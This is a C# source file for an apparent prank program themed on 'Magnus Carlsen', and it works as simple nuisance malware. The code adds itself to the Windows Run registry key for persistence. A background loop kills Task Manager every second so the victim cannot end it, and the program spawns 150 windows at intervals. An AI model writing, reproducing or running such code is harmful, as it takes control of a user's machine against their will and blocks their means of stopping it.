using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;

internal class MainProgram
{
    public static int timeout = 1000;
    private static void Antitaskmgr()
    {
        while (true)
        {
            try
            {
                var Processes = Process.GetProcesses();

                foreach (var proccess in Processes)
                {
                    if (proccess.ProcessName == "Taskmgr")
                    {
                        proccess.Kill();
                    }
                }
            }
            catch { }
            Thread.Sleep(timeout);
        }
    }
    private static void AddToStartup()
    {
        try
        {
            using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("HeyImMagnusCarlsen",
                    $"\"{Application.ExecutablePath}\" /background");
            }
        }
        catch {}
    }

    public static void spawnForm()
    {
        Application.Run(new Form1());
    }
    static void Main()
    {
        AddToStartup();
        Thread antimgr = new Thread(Antitaskmgr);
        antimgr.IsBackground = true;
        antimgr.Start();
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        for (int i = 0; i < 150 /*<- how much magnus carlsen */; i++)
        {
            Thread.Sleep(3500);
            Thread forms = new Thread(spawnForm);
            forms.IsBackground = true;
            forms.Start();
        }
    }
